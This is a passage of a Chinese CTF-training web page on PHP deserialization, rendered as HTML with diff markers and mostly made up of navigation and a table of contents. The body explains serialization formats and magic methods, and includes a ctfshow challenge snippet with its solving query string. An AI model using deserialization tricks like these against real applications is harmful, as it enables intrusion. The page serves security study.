+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Apache%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Apache 换行解析漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    培训任务
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            培训任务
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/pwn%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pwn培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/reverse%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    reverse培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ESSAY/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    随笔
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            随笔
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2405/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2405
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2404/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2404
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2403/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2403
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2402/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2402
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2401/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2401
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../TimeLine/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    时间线
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            时间线
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/DEC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    开发 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/WebSec/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../WEBSITE/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网站
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            网站
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/build/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网站构建说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/help/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文章编写帮助
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/test/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    测试文档
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      常见的序列化格式
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      案例
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="案例">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      数组序列化
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      对象序列化
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      反序列化中常见的魔术方法
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trick" class="md-nav__link">
+    <span class="md-ellipsis">
+      反序列化绕过小Trick
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化绕过小Trick">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php71" class="md-nav__link">
+    <span class="md-ellipsis">
+      php7.1+反序列化对类属性不敏感
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#__wakeup" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过__wakeup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过部分正则
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用引用
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#16" class="md-nav__link">
+    <span class="md-ellipsis">
+      16进制绕过字符的过滤
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP反序列化字符逃逸
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP反序列化字符逃逸">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-x" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 过滤后字符变多（反序列化后的一个x替换成为两个）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-x" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 过滤后字符变少(把反序列化后的两个x替换成为一个)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      对象注入
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP链简单介绍
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP原生类反序列化利用（暂无）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phar反序列化
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phar反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phar_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      什么是phar文件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      phar文件的结构
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞利用条件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      受影响的函数：
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过方式
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      php-session反序列化
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="php-session反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    <span class="md-ellipsis">
+      session简单介绍
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      session 的存储机制
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sessiontip" class="md-nav__link">
+    <span class="md-ellipsis">
+      session文件创建的几个tip
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phpinisession" class="md-nav__link">
+    <span class="md-ellipsis">
+      php.ini中一些session配置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用姿势
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用不同的引擎来处理session文件
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/AnistonH/AnistonH.github.io/raw/main/docs/WEB/others/PHP反序列化.md" title="查看本页的源代码" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="php">PHP反序列化<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
+<h2 id="_1">简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>什么是序列化？<code>serialize()</code></p>
+<p>对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 </p>
+<p>什么是反序列化？<code>unserialize()</code></p>
+<p>字符串转换成对象</p>
+<p>Tip：对字符串进行序列化后是它本身（ctfshow web260）</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-0-2"><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-0-3"><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-0-4"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span><span id="__span-0-5"><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow_i_love_36D/&#39;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">])))</span> <span class="p">{</span>
+</span><span id="__span-0-6">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span><span id="__span-0-7"><span class="p">}</span>
+</span><span id="__span-0-8"><span class="c1">//因此直接?ctfshow=/ctfshow_i_love_36D/ 即可</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="_2">常见的序列化格式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>二进制格式</li>
+<li>字节数组</li>
+<li>json字符串</li>
+<li>xml字符串</li>
+</ul>
+<h2 id="_3">案例<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">数组序列化<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-1-2"><span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="s1">&#39;hi&#39;</span><span class="p">);</span>
+</span><span id="__span-1-3"><span class="nv">$a_ser</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-1-4"><span class="k">echo</span> <span class="nv">$a_ser</span><span class="p">;</span>
+</span><span id="__span-1-5"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>结果：</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">a:2:{i:0;s:5:&quot;hello&quot;;i:1;s:2:&quot;hi&quot;;}
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1">2：表示a有两个元素
+</span><span id="__span-3-2">i：表示index；0：表示下标0
+</span><span id="__span-3-3">s：表示string字符串数组；5：长度为5
+</span></code></pre></div></td></tr></table></div>
+<p>解析</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1">a - array
+</span><span id="__span-4-2">b - boolean
+</span><span id="__span-4-3">d - double
+</span><span id="__span-4-4">i - integer
+</span><span id="__span-4-5">o - common object 
+</span><span id="__span-4-6">r - reference
+</span><span id="__span-4-7">s - string
+</span><span id="__span-4-8">C - custom object
+</span><span id="__span-4-9">O - class
+</span><span id="__span-4-10">N - null
+</span><span id="__span-4-11">R - pointer reference
+</span><span id="__span-4-12">U - unicode string
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_5">对象序列化<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-5-2"><span class="k">class</span> <span class="nc">Student</span>
+</span><span id="__span-5-3"><span class="p">{</span>
+</span><span id="__span-5-4">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span><span id="__span-5-5">    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+</span><span id="__span-5-6">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-5-7">    <span class="p">{</span>
+</span><span id="__span-5-8">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;abab&#39;</span><span class="p">;</span>
+</span><span id="__span-5-9">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
+</span><span id="__span-5-10">    <span class="p">}</span>
+</span><span id="__span-5-11">    <span class="k">function</span> <span class="nf">pr</span><span class="p">()</span>
+</span><span id="__span-5-12">    <span class="p">{</span>
+</span><span id="__span-5-13">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span><span id="__span-5-14">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
+</span><span id="__span-5-15">    <span class="p">}</span>
+</span><span id="__span-5-16"><span class="p">}</span>
+</span><span id="__span-5-17"><span class="nv">$stu</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Student</span><span class="p">();</span>
+</span><span id="__span-5-18"><span class="nv">$stu_ser</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$stu</span><span class="p">);</span>
+</span><span id="__span-5-19"><span class="k">echo</span> <span class="nv">$stu_ser</span>
+</span><span id="__span-5-20"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>结果</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1">O:7:&quot;Student&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;abab&quot;;s:3:&quot;age&quot;;i:18;}
+</span></code></pre></div></td></tr></table></div>
+<p><strong>注：序列化后的内容只有成员变量，没有成员函数</strong></p>
+<p>还有一种成员变量就是protected类型</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-7-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-7-3"><span class="p">{</span>
+</span><span id="__span-7-4">    <span class="k">public</span> <span class="nv">$aa</span><span class="p">;</span>
+</span><span id="__span-7-5">    <span class="k">private</span> <span class="nv">$bb</span><span class="p">;</span>
+</span><span id="__span-7-6">    <span class="k">protected</span> <span class="nv">$cc</span><span class="p">;</span>
+</span><span id="__span-7-7">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-7-8">    <span class="p">{</span>
+</span><span id="__span-7-9">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">aa</span> <span class="o">=</span> <span class="s1">&#39;aaa&#39;</span><span class="p">;</span>
+</span><span id="__span-7-10">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bb</span> <span class="o">=</span> <span class="s1">&#39;bbb&#39;</span><span class="p">;</span>
+</span><span id="__span-7-11">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cc</span> <span class="o">=</span> <span class="s1">&#39;ccc&#39;</span><span class="p">;</span>
+</span><span id="__span-7-12">    <span class="p">}</span>
+</span><span id="__span-7-13"><span class="p">}</span>
+</span><span id="__span-7-14"><span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+</span><span id="__span-7-15"><span class="nv">$d_ser</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+</span><span id="__span-7-16"><span class="k">echo</span> <span class="nv">$d_ser</span><span class="p">;</span>
+</span><span id="__span-7-17"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>如果是private类型，会在变量名前加上<code>\x00类名\x00</code>，如果是protected类型，则会加上<code>\x00*\x00</code>， 这些都是不可见字符</p>
+<p>输出则会导致不可见字符 <code>\x00</code> 的丢失</p>
+<p>结果：（不正常）</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1">O:4:&quot;test&quot;:3:{s:2:&quot;aa&quot;;s:3:&quot;aaa&quot;;s:8:&quot;testbb&quot;;s:3:&quot;bbb&quot;;s:5:&quot;*cc&quot;;s:3:&quot;ccc&quot;;}
+</span></code></pre></div></td></tr></table></div>
+<p><strong>如果需要本地存储推荐“urlencode”</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1">urlencode($d_ser);
+</span></code></pre></div></td></tr></table></div>
+<h2 id="_6">反序列化中常见的魔术方法<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1">__wakeup()      //执行unserialize()时，先会调用这个函数
+</span><span id="__span-10-2">__sleep()       //执行serialize()时，先会调用这个函数
+</span><span id="__span-10-3">__destruct()    //析构函数，对象被销毁时触发
+</span><span id="__span-10-4">__construct()   //构造函数，当创建对象时自动调用。
+</span><span id="__span-10-5">__call()        //在对象上下文中调用不可访问的方法时触发
+</span><span id="__span-10-6">__callStatic()  //在静态上下文中调用不可访问的方法时触发
+</span><span id="__span-10-7">__get()         //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
+</span><span id="__span-10-8">__set()         //用于将数据写入不可访问的属性
+</span><span id="__span-10-9">__isset()       //在不可访问的属性上调用isset()或empty()触发
+</span><span id="__span-10-10">__unset()       //在不可访问的属性上使用unset()时触发
+</span><span id="__span-10-11">__toString()    //把类当作字符串使用时触发
+</span><span id="__span-10-12">__invoke()      //当尝试将对象调用为函数时触发
+</span></code></pre></div></td></tr></table></div>
+<h2 id="trick">反序列化绕过小Trick<a class="headerlink" href="#trick" title="Permanent link">&para;</a></h2>
+<h3 id="php71">php7.1+反序列化对类属性不敏感<a class="headerlink" href="#php71" title="Permanent link">&para;</a></h3>
+<p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p>
+<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出   <code>abc</code></p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
